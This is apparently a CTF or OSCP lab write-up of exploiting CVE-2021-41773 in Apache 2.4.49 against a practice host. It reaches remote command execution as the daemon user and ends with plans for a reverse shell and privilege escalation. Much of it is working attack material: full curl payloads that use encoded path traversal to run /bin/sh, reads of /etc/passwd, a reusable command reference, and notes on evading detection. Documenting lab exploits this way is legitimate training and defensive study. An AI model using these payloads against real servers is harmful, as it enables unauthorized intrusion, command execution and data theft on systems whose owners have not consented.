# Exploitation - CVE-2021-41773 Apache 2.4.49 RCE

## Vulnerability Exploited
**CVE:** CVE-2021-41773
**Type:** Path Traversal → Remote Code Execution
**Target:** Apache HTTP Server 2.4.49
**Exploit:** ExploitDB #50383

---

## Initial Access - Remote Code Execution

### Step 1: Prepare Exploit

**Created target list:**
```bash
echo "http://offsecpoo.com" > targets.txt
```

**Copied exploit from ExploitDB:**
```bash
cp /usr/share/exploitdb/exploits/multiple/webapps/50383.sh ./apache_2.4.49_exploit.sh
```

---

### Step 2: Test Path Traversal (LFI)

**Attempt to read /etc/passwd:**
```bash
bash apache_2.4.49_exploit.sh targets.txt /etc/passwd
```

**Result:**
```
http://offsecpoo.com
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
<h1>Internal Server Error</h1>
```

**Analysis:**
- Server returns 500 error
- File exists but cannot be executed as CGI
- Path traversal works, but need executable target
- Confirms vulnerability, but need RCE payload

---

### Step 3: Achieve Remote Code Execution

**Execute `whoami` command:**
```bash
bash apache_2.4.49_exploit.sh targets.txt /bin/sh whoami
```

**Result:**
```
http://offsecpoo.com
daemon
```

**✅ SUCCESS - Remote Code Execution Achieved!**

**Current Access:**
- **User:** `daemon`
- **Shell Type:** Non-interactive (POST-based command execution)
- **Execution Method:** Commands sent as POST data to `/bin/sh` via path traversal

---

## Technical Breakdown of Successful Exploit

### The Malicious Request

**Full curl command executed by exploit:**
```bash
curl -s --path-as-is \
  -d "echo Content-Type: text/plain; echo; whoami" \
  "http://offsecpoo.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
```

### URL Breakdown

**Requested URL:**
```
http://offsecpoo.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
```

**Path components:**
1. `/cgi-bin/` - Start in CGI-enabled directory (required for RCE)
2. `.%2e` - URL-encoded `..` (first traversal)
3. `/%2e%2e/` - URL-encoded `../` (repeated 9 times)
4. `/bin/sh` - Final target (Linux shell)

**After Apache decodes:**
```
/cgi-bin/../../../../../../../../bin/sh
```

**Normalized path:**
```
/bin/sh
```

### Why It Works

**Apache 2.4.49 Bug:**
1. ✅ Checks for `../` patterns → Not found (sees `.%2e` instead)
2. ✅ Path passes security validation
3. ❌ Decodes `%2e` to `.` AFTER validation
4. ❌ Normalized path escapes webroot
5. ❌ Executes `/bin/sh` as CGI script

**CGI Execution:**
1. Apache thinks `/bin/sh` is a CGI script
2. POST data becomes stdin to the shell
3. Commands execute with Apache user privileges
4. Output returned in HTTP response

### POST Data Structure

```bash
-d "echo Content-Type: text/plain; echo; whoami"
```

**Components:**
1. `echo Content-Type: text/plain;` - Valid CGI header (required)
2. `echo;` - Empty line (separates headers from body per CGI spec)
3. `whoami` - Actual command to execute

**Why headers matter:**
- CGI scripts must output valid HTTP headers
- Apache expects `Content-Type` header first
- Empty line signals end of headers
- Without proper headers, Apache rejects output

---

## Exploitation Methodology

### Why This Vector Was Chosen

**SQLi vs Apache RCE Decision:**

**SQL Injection (discovered first):**
- ✅ 75% confidence in 3 parameters
- ❌ Error-based extraction didn't work
- ❌ Would require boolean-based blind (slow)
- ❌ May only lead to data exfiltration, not RCE
- ⏱️ Time-consuming to extract and leverage

**Apache CVE-2021-41773:**
- ✅ Known public exploit available
- ✅ Direct path to RCE
- ✅ Fast exploitation (single command)
- ✅ Confirmed vulnerable version (2.4.49)
- ✅ CGI enabled on target
- ⏱️ Minutes to achieve RCE

**Decision:** Exploit Apache RCE first for immediate shell access

---

## Current Access Summary

### What We Have

**Execution Capability:**
```bash
# Test current user
bash apache_2.4.49_exploit.sh targets.txt /bin/sh whoami
→ daemon

# Any Linux command via:
bash apache_2.4.49_exploit.sh targets.txt /bin/sh "COMMAND_HERE"
```

**Limitations:**
- Non-interactive shell (one command per request)
- No TTY (cannot use interactive programs)
- Output via HTTP response only
- Commands must complete quickly (HTTP timeout)

**Privileges:**
- Running as `daemon` user
- Limited privileges (Apache service account)
- May have restricted file system access
- Likely need privilege escalation for full root access

---

## Next Steps

### Immediate Actions Required:

1. **Enumerate system**
   - OS version
   - Kernel version
   - Running services
   - Network configuration
   - Current directory/permissions

2. **Establish stable shell**
   - Upload reverse shell script
   - Setup netcat listener
   - Establish persistent connection

3. **Locate flag**
   - Search common flag locations
   - Check user home directories
   - Review web directories

4. **Privilege escalation** (if needed)
   - Check sudo permissions
   - Find SUID binaries
   - Exploit kernel vulnerabilities
   - Service exploits

---

## Exploit Commands Reference

### Basic Command Execution
```bash
bash apache_2.4.49_exploit.sh targets.txt /bin/sh "COMMAND"
```

### System Enumeration Commands
```bash
# Current user
bash apache_2.4.49_exploit.sh targets.txt /bin/sh "whoami"

# OS/kernel info
bash apache_2.4.49_exploit.sh targets.txt /bin/sh "uname -a"

# Current directory
bash apache_2.4.49_exploit.sh targets.txt /bin/sh "pwd"

# List directory
bash apache_2.4.49_exploit.sh targets.txt /bin/sh "ls -la"

# Find flag
bash apache_2.4.49_exploit.sh targets.txt /bin/sh "find / -name '*flag*' 2>/dev/null"
```

### File Operations
```bash
# Read file
bash apache_2.4.49_exploit.sh targets.txt /bin/sh "cat /path/to/file"

# Search for files
bash apache_2.4.49_exploit.sh targets.txt /bin/sh "find /home -type f 2>/dev/null"
```

---

## Manual Exploitation (Without Script)

**For OSCP exam reference - understanding raw exploitation:**

```bash
# Single command execution
curl -s --path-as-is \
  -d "echo Content-Type: text/plain; echo; whoami" \
  "http://TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"

# Read arbitrary file (if CGI not enabled)
curl -s --path-as-is \
  "http://TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# Execute different command
curl -s --path-as-is \
  -d "echo Content-Type: text/plain; echo; id" \
  "http://TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
```

**Key flags explained:**
- `--path-as-is`: Disable path normalization (CRITICAL)
- `-s`: Silent mode (suppress progress)
- `-d "DATA"`: POST data (becomes shell commands)

---

## Lessons Learned

### Why Version Enumeration Matters
- Apache 2.4.49 has specific, critical vulnerability
- Version 2.4.48: Not vulnerable
- Version 2.4.50: Different CVE (CVE-2021-42013)
- Version 2.4.51+: Patched

**Always enumerate exact versions during reconnaissance!**

### CVE Research is Critical
- Public exploits save significant time
- `searchsploit` should be routine after version discovery
- Web searches for "PRODUCT VERSION vulnerabilities" essential
- GitHub often has better exploits than ExploitDB

### Path Traversal Variations
- Standard LFI tests (`?page=../../etc/passwd`) failed
- CVE-specific payloads worked (`.%2e` encoding)
- Different applications have different bypass techniques
- Always research known vulnerabilities for discovered software

### CGI Significance
- `/cgi-bin/` directory indicates CGI enabled
- CGI + Path Traversal = RCE potential
- Even 403 Forbidden on `/cgi-bin/` can be bypassed with traversal
- CGI executes files as scripts (dangerous with path traversal)

---

## Defense Evasion Notes

**Why this exploit is hard to detect:**
- Uses legitimate HTTP methods (POST to valid path)
- URL encoding obfuscates malicious intent
- No obvious attack signatures in logs
- Appears as normal CGI request
- Commands hidden in POST body (not logged by default)

**Detection opportunities:**
- Unusual `%2e` patterns in URLs
- Requests to `/cgi-bin/` with deep traversal
- POST requests to binary executables
- Response size anomalies (command output vs normal page)

---

## Timestamps

- **Enumeration Start:** October 5, 2025
- **SQLi Discovery:** ~22:00-23:00
- **Apache Version Identified:** From earlier whatweb scan
- **CVE Research:** ~23:30
- **RCE Achieved:** ~23:45
- **User:** daemon
- **Access Level:** Low-privileged command execution

---

## Files Created During Exploitation

```
./targets.txt                    - Target list for exploit script
./apache_2.4.49_exploit.sh      - Copied ExploitDB #50383
```

## Evidence/Proof

**Command executed:**
```bash
bash apache_2.4.49_exploit.sh targets.txt /bin/sh whoami
```

**Output received:**
```
http://offsecpoo.com
daemon
```

**Proof of RCE:** Command output returned successfully ✅
